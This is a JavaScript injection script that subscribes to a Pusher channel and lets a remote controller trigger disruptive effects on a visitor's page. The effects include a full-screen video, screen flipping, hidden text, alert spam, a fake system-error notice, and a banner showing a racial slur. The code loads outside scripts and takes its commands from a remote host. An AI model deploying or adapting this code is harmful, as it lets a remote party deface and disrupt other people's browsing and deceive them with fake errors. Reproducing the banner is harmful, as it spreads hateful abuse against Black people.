if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') === 'true') {
  window.__chaosInjected = true;

  (function () {
    
    const script = document.createElement('script');
    script.src = 'https://js.pusher.com/7.2/pusher.min.js';
    script.onload = () => {
      const pusher = new Pusher('f02c3722bd883d397025', { cluster: 'eu' });
      const channel = pusher.subscribe('chaos-channel');

      const activeEffects = new Set();

      const activate = {
        videoBomb: () => {
          if (document.getElementById('__chaos_video')) return;
          const vid = document.createElement('video');
          vid.id = '__chaos_video';
          vid.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
          vid.autoplay = true;
          vid.loop = true;
          vid.muted = true;
          Object.assign(vid.style, {
            position: 'fixed', top: 0, left: 0,
            width: '100vw', height: '100vh',
            zIndex: 2147483646
          });
          document.body.appendChild(vid);
        },
        changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
        shake: () => {
          if (document.getElementById('__chaos_shake')) return;
          const s = document.createElement('style');
          s.id = '__chaos_shake';
          s.textContent = `@keyframes shake { 0%{transform:translate(0,0);}50%{transform:translate(2px,-2px);}100%{transform:translate(-2px,2px);} }
          * { animation: shake 0.1s infinite; }`;
          document.head.appendChild(s);
        },
        invertColors: () => document.body.style.filter = 'invert(1)',
        blurScreen: () => document.body.style.filter = 'blur(5px)',
        zoomIn: () => document.body.style.transform = 'scale(1.2)',
        zoomOut: () => document.body.style.transform = 'scale(0.8)',
        flipScreen: () => document.body.style.transform = 'rotate(180deg)',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = 'transparent'),
        rainbowText: () => {
          if (document.getElementById('__chaos_rainbow')) return;
          const s = document.createElement('style');
          s.id = '__chaos_rainbow';
          s.textContent = `@keyframes rainbow { 0%{color:red;}25%{color:orange;}50%{color:green;}75%{color:blue;}100%{color:violet;} }
          * { animation: rainbow 2s infinite; }`;
          document.head.appendChild(s);
        },
        cursorTrail: () => {
          document.addEventListener('mousemove', e => {
            const dot = document.createElement('div');
            dot.style = `position:fixed;left:${e.pageX}px;top:${e.pageY}px;width:5px;height:5px;background:#0ff;border-radius:50%;z-index:999999;pointer-events:none`;
            document.body.appendChild(dot);
            setTimeout(() => dot.remove(), 500);
          });
        },
        popupSpam: () => {
          for (let i = 0; i < 3; i++) alert('💥 Chaos!');
        },
        fakeError: () => {
          if (document.getElementById('__chaos_error')) return;
          const err = document.createElement('div');
          err.id = '__chaos_error';
          err.textContent = '⚠️ System Error: Chaos overload';
          Object.assign(err.style, {
            position: 'fixed', bottom: '10px', right: '10px',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '16px', zIndex: 999999
          });
          document.body.appendChild(err);
        },
        typewriter: () => {
          if (document.getElementById('__chaos_typewriter')) return;
          const t = document.createElement('div');
          t.id = '__chaos_typewriter';
          t.style = 'position:fixed;bottom:20px;left:20px;color:#0ff;font-family:monospace;font-size:20px;z-index:999999';
          document.body.appendChild(t);
          let i = 0;
          const text = 'CHAOS MODE ENGAGED';
          const interval = setInterval(() => {
            if (i < text.length) t.textContent += text[i++];
            else clearInterval(interval);
          }, 100);
        },
        confetti: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js';
          s.onload = () => confetti({ particleCount: 100, spread: 70 });
          document.body.appendChild(s);
        },
        snowfall: () => {
          const s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/snowfall-js@1.0.0/snowfall.min.js';
          document.body.appendChild(s);
        },
        darkMode: () => document.body.style.background = '#000',
        lightMode: () => document.body.style.background = '#fff',
        broadcast: () => {
          if (document.getElementById('__chaos_broadcast')) return;
          const banner = document.createElement('div');
          banner.id = '__chaos_broadcast';
          banner.textContent = '🚨 Fuck Niggers 🚨';
          Object.assign(banner.style, {
            position: 'fixed', top: 0, left: 0, width: '100%',
            background: 'red', color: 'white', padding: '10px',
            fontSize: '20px', textAlign: 'center', zIndex: 999999
          });
          document.body.appendChild(banner);
        },
        glitch: () => {
          if (document.getElementById('__chaos_glitch')) return;
          const s = document.createElement('style');
          s.id = '__chaos_glitch';
          s.textContent = `* { animation: glitch 0.2s infinite; }
          @keyframes glitch { 0%{transform:skew(0deg);}50%{transform:skew(5deg);}100%{transform:skew(-5deg);} }`;
          document.head.appendChild(s);
        }
      };

      const deactivate = {
        videoBomb: () => document.getElementById('__chaos_video')?.remove(),
        shake: () => document.getElementById('__chaos_shake')?.remove(),
        invertColors: () => document.body.style.filter = '',
        blurScreen: () => document.body.style.filter = '',
        zoomIn: () => document.body.style.transform = '',
        zoomOut: () => document.body.style.transform = '',
        flipScreen: () => document.body.style.transform = '',
        hideText: () => document.querySelectorAll('*').forEach(e => e.style.color = ''),
        rainbowText: () => document.getElementById('__chaos_rainbow')?.remove(),
        fakeError: () => document.getElementById('__chaos_error')?.remove(),
        typewriter: () => document.getElementById('__chaos_typewriter')?.remove(),
        broadcast: () => document.getElementById('__chaos_broadcast')?.remove(),
        glitch: () => document.getElementById('__chaos_glitch')?.remove(),
        darkMode: () => document.body.style.background = '',
        lightMode: () => document.body.style.background = ''
      };

      function toggleEffect(action) {
        if (activeEffects.has(action)) {
          deactivate[action]?.();
          activeEffects.delete(action);
        } else {
          activate[action]?.();
          activeEffects.add(action);
        }
      }

      channel.bind('chaos-event', data => {
        toggleEffect(data.action);
      });
    };

    document.body.appendChild(script);
  })();
}
